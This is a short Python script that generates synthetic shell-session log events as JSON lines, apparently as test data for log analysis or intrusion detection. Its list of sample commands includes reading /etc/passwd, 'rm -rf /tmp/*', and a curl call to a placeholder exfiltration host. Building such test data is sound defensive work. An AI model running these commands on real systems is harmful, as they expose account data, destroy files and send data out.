# sample_logs_generator.py
import json, random, uuid, time
from datetime import datetime, timedelta

USERS = ["alice", "bob", "carol", "dave"]
HOSTS = ["web-1","db-2","app-3"]
COMMANDS = [
    "ls -la", "cat /etc/passwd", "tar -czf /tmp/backup.tar /var/www", "scp file user@10.0.0.1:/tmp",
    "sudo systemctl restart nginx", "python3 script.py", "rm -rf /tmp/*", "curl http://exfil.example/upload"
]
IPS = ["203.0.113.1","198.51.100.5","192.0.2.10","10.0.0.5"]

def gen_event(user=None):
    uid = str(uuid.uuid4())
    user = user or random.choice(USERS)
    host = random.choice(HOSTS)
    cmd = random.choice(COMMANDS)
    src_ip = random.choice(IPS)
    now = datetime.utcnow() - timedelta(minutes=random.randint(0,60*24))
    event = {
        "timestamp": now.isoformat() + "Z",
        "host": host,
        "src_ip": src_ip,
        "user": user,
        "target_account": "root" if random.random() < 0.05 else user,
        "auth_method": "publickey" if random.random() < 0.8 else "password",
        "auth_result": "success" if random.random() < 0.95 else "failure",
        "tty": f"pts/{random.randint(0,10)}",
        "command": cmd,
        "exit_code": 0 if random.random() < 0.95 else 1,
        "session_id": uid[:8]
    }
    return event

def generate(filename="logs.jsonl", n=2000):
    with open(filename, "w", encoding="utf-8") as f:
        for _ in range(n):
            e = gen_event()
            f.write(json.dumps(e, ensure_ascii=False) + "\n")
    print(f"Generated {n} events into {filename}")

if __name__ == "__main__":
    generate()
